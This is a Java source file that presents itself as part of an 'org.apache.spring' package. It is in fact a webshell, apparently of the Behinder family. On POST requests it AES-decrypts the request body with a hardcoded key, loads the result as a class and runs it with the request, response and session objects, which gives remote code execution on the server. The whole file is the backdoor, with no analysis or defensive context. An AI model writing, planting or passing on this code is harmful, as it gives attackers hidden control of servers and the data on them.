package org.apache.spring;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class b {
    public static void d(Object request, Object response, Object session) throws Exception {
        class U extends ClassLoader {
            U(ClassLoader c) {
                super(c);
            }
            public Class g(byte[] b) {
                return super.defineClass(b, 0, b.length);
            }
        }
        if (r.getMethod(request).equals("POST")) {
            Map<String, Object> obj = new HashMap<String, Object>();
            obj.put("request", request);
            obj.put("response", response);
            obj.put("session", session);
            String k = "e45e329feb5d925b";
            s.putValue(session, "u", k);
            Cipher c = Cipher.getInstance("AES");
            c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
            String buf = r.readLine(r.getReader(request));
            new U(b.class.getClassLoader())
                    .g(c.doFinal(Base64.getDecoder().decode(buf)))
                    .newInstance().equals(obj);
        }
    }
}
